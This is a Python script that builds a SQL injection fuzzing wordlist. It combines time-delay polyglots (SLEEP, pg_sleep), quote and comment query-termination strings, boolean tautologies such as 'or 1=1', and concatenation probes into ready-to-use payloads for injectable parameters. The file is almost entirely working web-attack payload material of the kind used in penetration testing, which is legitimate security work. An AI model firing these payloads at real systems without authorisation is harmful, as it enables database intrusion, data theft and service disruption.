# resources
# https://www.w3schools.com/sql/sql_operators.asp
# https://www.w3schools.com/sql/sql_wildcards.asp

polyglots = [
    '',
    '1\'"`();/**/--#',
    'SLEEP(20) /*\' or SLEEP(20) or \'" or SLEEP(20) or "*/',
    '(select 1 from pg_sleep(20)) /*\' or (select 1 from pg_sleep(20)) or \'" or (select 1 from pg_sleep(20)) or "*/',
]

prefixes = [
    ' ',
    ')',
    '{quotation_mark}',
    '{quotation_mark})'
    # '{quotation_mark})',
    # '{quotation_mark}))',
    # '{quotation_mark})))',
    # ')',
    # '))',
    # ')))'
]

suffixes = [
    '',
    '--',
    ' -- ',
    '#',
    '/*',
    '%00'
]
suffixes = suffixes + [';' + s for s in suffixes]

logical_operators = [
    'or',
    'and'
]

comparison_operators = [
    '=',
    '<>',
    # '<',
    # '>',
]

quotation_marks = [
    '\'',
    '"',
    # '`'
]

boolean_templates = [
    '{prefix}{logical_operator}{quotation_mark}1{quotation_mark}{comparison_operator}{quotation_mark}1{no_suffix}',
    '{prefix}{logical_operator}{quotation_mark}1{quotation_mark}{comparison_operator}{quotation_mark}2{no_suffix}',
    '{prefix}{logical_operator} 1{comparison_operator}1{suffix}',
    '{prefix}{logical_operator} 1{comparison_operator}2{suffix}',
    '{prefix}{logical_operator}(1{comparison_operator}1){suffix}',
    '{prefix}{logical_operator}(1{comparison_operator}2){suffix}',
    '{prefix}{logical_operator} true{suffix}',
    '{prefix}{logical_operator} false{suffix}',
    '{prefix}{logical_operator}(true){suffix}',
    '{prefix}{logical_operator}(false){suffix}'
]

string_concat_templates = [
    '{quotation_mark} {quotation_mark}',
    '{quotation_mark} {quotation_mark}1',
    '{quotation_mark}+{quotation_mark}',
    '{quotation_mark}+{quotation_mark}1',
    '{quotation_mark}||{quotation_mark}',
    '{quotation_mark}||{quotation_mark}1'
]

wildcard_operators = [
    '%',
    '*'
]

wildcard_templates = [
    '{wildcard_operator}',
    '{wildcard_operator}{wildcard_operator}',
    '{wildcard_operator}' + '_' * 1 + '{wildcard_operator}',
    '{wildcard_operator}' + '_' * 5 + '{wildcard_operator}',
    '{wildcard_operator}' + '_' * 50 + '{wildcard_operator}',
]


def generate():
    wordlist = []

    # polyglots
    wordlist += polyglots

    # early query termination
    for quotation_mark in quotation_marks:
        for prefix in prefixes:
            for suffix in suffixes:
                word = prefix + suffix
                if word.startswith(' '):
                    word = word[1:]
                word = word.replace('{quotation_mark}',quotation_mark)
                if word not in wordlist:
                    wordlist.append(word)

    # string concat boolean
    for quotation_mark in quotation_marks:
        for string_concat_template in string_concat_templates:
            word = string_concat_template
            word = word.replace('{quotation_mark}',quotation_mark)
            if word not in wordlist:
                wordlist.append(word)

    # boolean
    for quotation_mark in quotation_marks:
        for boolean_template in boolean_templates:
            for logical_operator in logical_operators:
                for prefix in prefixes:
                    for suffix in suffixes:
                        for comparison_operator in comparison_operators:
                            word = boolean_template
                            word = word.replace('{prefix}',prefix)
                            word = word.replace('{suffix}',suffix)
                            word = word.replace('{no_suffix}','')
                            word = word.replace('{logical_operator}',logical_operator)
                            word = word.replace('{comparison_operator}',comparison_operator)
                            word = word.replace('{quotation_mark}',quotation_mark)
                            if word not in wordlist:
                                wordlist.append(word)

    # string concat boolean

    # wildcard

    return wordlist

